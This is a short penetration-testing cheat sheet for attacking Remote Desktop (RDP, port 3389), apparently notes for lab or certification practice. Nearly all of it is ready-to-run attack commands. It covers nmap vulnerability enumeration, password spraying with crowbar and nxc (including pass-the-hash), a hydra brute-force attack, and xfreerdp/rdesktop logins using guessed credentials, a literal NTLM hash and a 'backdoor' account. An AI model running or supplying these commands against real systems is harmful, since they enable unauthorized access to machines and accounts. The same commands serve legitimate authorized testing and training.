# RDP Port 3389

##### Enumeration

````
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 $ip -Pn
````

##### Password Spray

````
crowbar -b rdp -s 10.11.1.7/32 -U users.txt -C rockyou.txt
nxc rdp $ip -u users.txt -p passwords.txt --continue-on-success
nxc rdp $ip -u users.txt -H $HASH --continue-on-success
````

##### Password Cracking

```bash
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

###### logging in

````
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
xfreerdp /v:$ip /u:backdoor /p:Password123 /cert:ignore +clipboard
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be22022754bf0975251e1e7ac
rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
````